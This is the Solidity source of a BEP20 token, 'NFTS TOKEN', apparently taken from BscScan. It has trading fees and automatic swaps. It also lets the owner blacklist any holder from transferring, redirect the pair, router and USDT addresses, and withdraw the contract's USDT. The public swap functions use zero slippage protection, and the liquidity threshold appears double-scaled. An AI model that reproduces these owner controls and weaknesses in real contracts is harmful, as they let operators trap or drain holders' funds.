/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;
interface SWAP{
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IBEP20 public tokenu;
  IBEP20 public metoken;
  SWAP public meswap;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _whiteaddress;
  mapping (address => bool) private _dogacc;
  mapping(uint => address) private _lpacc;
  mapping(address => bool) private _passaddress;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  uint256 private minsellje=10*10**18;//最少多少币才开始卖出
  uint256 private minhlje=1*10**18;//最少多少开始回流

  address public mainrouter=address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
  address public factory=address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
  address public lpacc;
  
  address zeroacc = 0x0000000000000000000000000000000000000000;
  address jjhacc = 0x1D43d622273076cdF10d3bbdC21eDE9c4A28B88f;
  address szacc = 0x1cBDd60644D906C6aF2E96b30042DE14650053Eb;
  address yxacc = 0x6cB08d815D43C04a08494AA87B1BE4AD5B89B478;
  address bmdacc = 0x6893b0bB0039dE05726A8ce80a65EC7527A6Af6a;

  address glacc = 0xc5EeB77dCe7FeC2E2C69F9BfEB799a2da85958f7;
  address dzacc = 0xF665BAEe9fC73D36DBafAFFBd8484d2eB600d6B2;
  address stacc = 0xe37113267fD954f2e36793614eDFf52d0489425C;

  address zzacc = 0x085060744B92Fec5487a668C457AC798283b7E1A;
  address tokenacc = address(this);

  address usdtacc = 0x55d398326f99059fF775485246999027B3197955;

  constructor() public {
    _name = "NFTS TOKEN";
    _symbol = "NFTS";
    _decimals = 18;
    _totalSupply = 2100 * 10000 * 10**18;
    
    _whiteaddress[msg.sender]=true;
    _whiteaddress[jjhacc]=true;
    _whiteaddress[szacc]=true;
    _whiteaddress[yxacc]=true;
    _whiteaddress[bmdacc]=true;

    _whiteaddress[glacc]=true;
    _whiteaddress[dzacc]=true;
    _whiteaddress[stacc]=true;
    _whiteaddress[zzacc]=true;
    _whiteaddress[tokenacc]=true;
    
    _whiteaddress[0x0000000000000000000000000000000000000000]=true;

    _balances[jjhacc] = _totalSupply.mul(10).div(100);
    emit Transfer(address(0),jjhacc, _totalSupply.mul(10).div(100));
    _balances[szacc] = _totalSupply.mul(10).div(100);
    emit Transfer(address(0),szacc, _totalSupply.mul(10).div(100));
    _balances[yxacc] = _totalSupply.mul(30).div(100);
    emit Transfer(address(0),yxacc, _totalSupply.mul(30).div(100));
    _balances[bmdacc] = _totalSupply.mul(50).div(100);
    emit Transfer(address(0),bmdacc, _totalSupply.mul(50).div(100));

    lpacc = IUniswapV2Factory(factory).createPair(tokenacc,usdtacc);
  }

  function getOwner() external view returns (address) {
    return owner();
  }
  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
  function addwhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = true;
  }
  function removewhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = false;
  }
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(_dogacc[sender]!=true, "BEP20: transfer to the dog address");
    require(_dogacc[recipient]!=true, "BEP20: transfer to the dog address");
    
    if(_whiteaddress[sender]==true || _whiteaddress[recipient]==true || recipient==tokenacc || sender==tokenacc){
       _tokenTransfer(sender,recipient,amount);
    }else if(sender==lpacc){//买入
       _tokenTransfer(sender,glacc,amount.mul(8).div(1000));
       _tokenTransfer(sender,stacc,amount.mul(9).div(1000));
       _tokenTransfer(sender,tokenacc,amount.mul(3).div(1000));
       _tokenTransfer(sender,recipient,amount.mul(98).div(100));
    }else if(recipient==lpacc){//卖出
       _tokenTransfer(sender,glacc,amount.mul(8).div(1000));
       _tokenTransfer(sender,stacc,amount.mul(9).div(1000));
       _tokenTransfer(sender,tokenacc,amount.mul(3).div(1000));
       _tokenTransfer(sender,recipient,amount.mul(98).div(100));
    }else{
        _tokenTransfer(sender,recipient,amount.mul(100).div(100));
        tokenu = IBEP20(usdtacc);
        uint256 uje=tokenu.balanceOf(tokenacc);
        if(_balances[tokenacc]>minsellje){
          autosell();
        }else if(uje>minhlje){
          autoaddLiquidity();
        }else{}
    }
    
  }

  function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
 }
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
  function setmainrouter(address _acc) public onlyOwner{
        mainrouter = _acc;
  }
  function setlpacc(address _lpacc) public onlyOwner{
        lpacc = _lpacc;
  }
  function setusdtacc(address _usdtacc) public onlyOwner{
        usdtacc = _usdtacc;
  }
  function setminhlje(uint _minhlje) public onlyOwner{
        minhlje = _minhlje*10**18;
  }
  function setminsellje(uint _minsellje) public onlyOwner{
        minsellje = _minsellje*10**18;
  }
  function showdog(address acc)public view returns(bool){
      return _dogacc[acc];
  }
  function adddogacc(address _acc) public onlyOwner{
        _dogacc[_acc] = true;
  }
  function removedogacc(address _acc) public onlyOwner{
        _dogacc[_acc] = false;
  }
  function setzzacc(address _acc) public onlyOwner{
        zzacc=_acc;
  }
  function autoapprovetoken(address token,address to)external onlyOwner returns (bool){
      metoken = IBEP20(token);
      metoken.approve(to,10*10**27);
      return true;
  }

function autosell()public returns(bool){
      address[] memory path = new address[](2);
      path[0]=tokenacc;
      path[1]=usdtacc;

      uint256 sellje = _balances[tokenacc].mul(50).div(100);
      if(sellje<=0){
          return true;
      }
      
      SWAP(mainrouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        sellje,
        0,
        path,
        zzacc,
        3280730638
      );

      tokenu.transferFrom(zzacc,tokenacc,tokenu.balanceOf(zzacc));
      return true;
  }
  function autoaddLiquidity()public returns(bool){
      tokenu = IBEP20(usdtacc);
      uint256 uje=tokenu.balanceOf(tokenacc);
      uint256 tokenje=_balances[tokenacc];
      if(uje<minhlje*10**18){
          return true;
      }
      SWAP(mainrouter).addLiquidity(
        usdtacc,
        tokenacc,
        uje,
        tokenje,
        0,
        0,
        zzacc,
        3280730638
     );
     return true;
  }

  function drawusdt(address to,uint256 amount)public onlyOwner{
     IBEP20(usdtacc).transfer(to,amount);
  }
}